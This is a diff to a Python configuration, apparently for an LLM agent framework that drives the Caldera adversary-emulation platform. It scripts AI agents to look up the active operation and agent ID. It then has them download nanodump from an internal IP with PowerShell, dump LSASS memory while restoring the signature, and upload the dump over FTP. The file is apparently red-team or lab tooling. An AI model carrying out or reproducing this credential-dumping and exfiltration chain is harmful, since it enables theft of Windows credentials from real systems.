@@ -6,12 +6,13 @@ actions = {
         {
             "message": "Get the ID of the active Caldera operation.",
             "summary_method": "last_msg",
+            "carryover": "Replace this placeholder with the ID of the active Caldera operation.",
             "agent": caldera_agent,
         },
         {
             "message": "Get the PAW of the active Caldera agent by calling /api/v2/agents.",
             "summary_method": "last_msg",
-            "carryover": "summarize The ID of the active Caldera operation and PAW of the agent in a table.",
+            "carryover": "Replace this placeholder with the PAW of the active Caldera agent.",
             "agent": caldera_agent,
         },
     ],
@@ -52,22 +53,25 @@ actions = {
     "DOWNLOAD_AND_RUN_NANODUMP": [
         {
             "message": "Use powershell to download http://192.168.162.11:8800/nanodump.x64.exe if it does not exist yet, and save it to C:\\temp of the active agent.",
+            "summary_method": "last_msg",
+            "carryover": "Replace this placeholder with the local full path to the downloaded nanodump executable.",
             "agent": caldera_agent,
         },
         {
             "message": "A complete list of all the available nanodump flags from https://raw.githubusercontent.com/fortra/nanodump/main/README.md",
+            "summary_method": "last_msg",
+            "carryover": "Replace this placeholder with an exhaustive list of all available nanodump flags and their description.",
             "agent": internet_agent,
         },
         {
             "message": "Use powershell to run the downloaded nanodump executable to dump LSASS without forking and pay attention to restoring the signature. Write the dump to C:\\temp.",
-            "carryover": [
-                "A complete list of all the available nanodump flags and their short descriptions.",
-                "The full local path to the downloaded nanodump executable.",
-            ],
+            "summary_method": "last_msg",
+            "carryover": "Replace this placeholder with the path to the dumped local LSASS output file.",
             "agent": caldera_agent,
         },
         {
             "message": "Upload the dumped LSASS file using FTP.",
+            "summary_method": "reflection_with_llm",
             "agent": caldera_agent,
         },
     ],
